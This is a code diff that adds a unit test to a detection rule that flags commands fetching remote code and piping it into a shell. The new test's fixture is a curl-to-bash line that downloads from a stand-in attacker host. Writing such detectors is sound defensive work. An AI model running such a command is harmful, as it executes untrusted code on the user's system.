@@ -43,4 +43,10 @@ describe("remoteFetchExecRule", () => {
     const findings = remoteFetchExecRule(pipeline("bash script.sh"));
     expect(findings).toHaveLength(0);
   });
+
+  it("names the real URL, not a -X method value, as the fetched target", () => {
+    const findings = remoteFetchExecRule(pipeline("curl -X GET http://evil.sh | bash"));
+    expect(findings[0].reason).toContain("http://evil.sh");
+    expect(findings[0].reason).not.toContain("Fetches GET");
+  });
 });
